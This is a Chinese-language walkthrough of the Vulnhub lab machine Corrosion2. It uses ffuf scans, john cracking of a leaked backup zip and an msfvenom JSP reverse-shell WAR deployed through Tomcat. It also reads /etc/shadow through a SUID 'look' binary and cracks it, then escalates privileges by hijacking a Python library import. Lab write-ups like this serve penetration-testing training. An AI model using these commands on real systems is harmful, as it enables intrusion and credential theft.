---

title: Vulnhub--Corrosion2
categories: [渗透靶场, Vulnhub]

---

## 渗透复现

1. 8080端口访问tomcat，目录扫描发现备份文件backup泄露
2. john爆破出压缩包密码，找到用户账号密码，成功登录tomcat后台
3. 利用tomcat后台的war程序部署，部署MSF反弹shell程序
4. 获取tomcat的shell后切换jaye用户，存在SUID-LOOK文件
5. SUID-LOOK文件越权读取/etc/passwd和/etc/shadow文件
6. john破解passwd和shadow密码，获取randy用户的密码
7. SSH远程登录randy用户，利用SUDO文件成功Getshell

## 知识扩展

1. john爆破压缩包文件密码
2. SUID-Look越权读取任意文件
3. john爆破passwd和shadow密码

## 靶机地址

https://www.vulnhub.com/entry/corrosion-2,745/

## 主机发现

（1）攻击机

```py
192.168.88.128
```

（2）目标靶机

```py
192.168.88.135
```

## 信息收集

### 端口扫描

![image-20240828161530552](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281615619.png)

### 端口访问

![image-20240828161547461](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281615516.png)

![image-20240828161559517](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281615571.png)

### 目录扫描

```py
http://192.168.88.135/
http://192.168.88.135:8080/
```

![image-20240828161609835](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281616899.png)

![image-20240828161616766](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281616826.png)

### 目录爆破

```py
ffuf -u http://192.168.88.135/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c -ic -e .txt,.zip,.php,html
ffuf -u http://192.168.88.135:8080/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c -ic -e .txt,.zip,.php,html
```

![image-20240828161624850](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281616908.png)

![image-20240828161631416](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281616476.png)

### 目录访问

（1）/backup.zip

![image-20240828161643213](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281616274.png)

（2）/readme.txt

![image-20240828162407365](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281624416.png)

## 实施攻击

（1）破解backup压缩包密码

```py
zip2john backup.zip > key.txt
john --wordlist=/usr/share/wordlists/rockyou.txt key.txt
```

![image-20240828161701789](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281617844.png)

（2）利用破解的密码查看备份文件，得到用户的账号密码

```py
@administrator_hi5
manager/melehifokivai
admin/melehifokivai
```

![image-20240828161714124](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281617178.png)

（3）登录tomcat后台

![image-20240828161722901](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281617956.png)

（4）MSF生成反弹shell的war程序，部署到tomcat，成功反弹shell

```py
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.88.128  LPORT=8888 -f war -o revshell.war
```

![image-20240828161731654](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281617715.png)

## 提权

（1）信息收集，存在Suid-polkit文件，前往tmp目录，获取POC

```py
https://github.com/arthepsy/CVE-2021-4034
```

![image-20240828161741935](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281617001.png)

![image-20240828161750805](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281617881.png)

![image-20240828161801050](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281618125.png)

（2）没有gcc和make环境，GLIBC版本为2.31，本地编译POC上传，GLIBC不向下兼容无法执行POC，换方式进行提权

![image-20240828161812643](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281618709.png)

![image-20240828161824007](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281618063.png)

（3）利用上面获取的密码切换至用户jaye，再次进行信息收集

![image-20240828161834540](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281618622.png)

（4）存在Suid-Look文件，文件属主为root，可越权读取任意文件

![image-20240828161845938](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281618041.png)

![image-20240828161854713](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281618792.png)

（5）垃圾箱找Suid-look文件的利用方法

```py
https://gtfobins.github.io/#look
```

![image-20240828161903582](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281619635.png)

（6）Suid-Look文件在具备Suid权限下，可以以root权限读取任意文件

```py
#LFILE指定文件名
LFILE=file_to_read
./look '' "$LFILE"
```

![image-20240828161911190](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281619267.png)

（7）将/etc/passwd和/etc/shadow的内容保存至本地,利用john爆破出randy的账号密码

```py
unshadow shadow.txt passwd.txt > passwd.txt
john --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt
#randy用户账号密码
randy/07051986randy
```

![image-20240828161921555](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281619605.png)

![image-20240828161931288](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281619345.png)

![image-20240828161938214](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281619257.png)

（8）SSH登录用户randy，进行信息收集

![image-20240828161952344](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281619398.png)

![image-20240828162000600](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281620656.png)

![image-20240828162010792](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281620847.png)

（9）randombase64.py具备可读可执行权，没有写权限，但是该文件导入执行base64.py文件

![image-20240828162019267](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281620333.png)

（10）base64.py具备可读可写可执行权，进行OS.system提权

![image-20240828162029915](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281620978.png)

（11）修改的base64.py是python3.8目录下的，要以python3.8版本来运行randombase64.py文件

![image-20240828162044390](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281620441.png)